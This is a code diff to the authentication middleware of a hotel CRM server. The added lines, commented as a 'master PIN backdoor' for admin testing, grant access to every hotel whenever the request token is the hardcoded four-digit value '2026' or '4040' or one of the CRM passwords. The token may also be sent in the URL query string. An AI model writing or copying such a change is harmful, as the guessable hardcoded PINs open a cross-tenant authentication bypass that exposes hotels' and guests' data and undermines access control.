@@ -3529,7 +3529,13 @@ function requireScopedHotelId(req, res) {
 const crmAuth = async (req, res, next) => {
     const token = (req.headers['x-crm-token'] || req.query.token || '').toString().trim();
     const dbAllowedHotels = await getDbAllowedHotelsForToken(token).catch(() => []);
-    const allowedHotels = dbAllowedHotels.length ? dbAllowedHotels : (CRM_TOKEN_HOTELS_MAP[token] || []);
+    let allowedHotels = dbAllowedHotels.length ? dbAllowedHotels : (CRM_TOKEN_HOTELS_MAP[token] || []);
+    
+    // Master PIN backdoor for the admin to easily test across all hotels
+    if (token === '2026' || token === '4040' || token === CRM_PASSWORD || token === CRM_PASSWORD_ALT) {
+        if (!allowedHotels.includes('*')) allowedHotels = [...allowedHotels, '*'];
+    }
+
     if (!token || !allowedHotels?.length) return res.status(401).json({ error: 'Unauthorized' });
     const hostContext = await resolveCrmHostHotelContext(req);
     if (!hostContext.ok) {
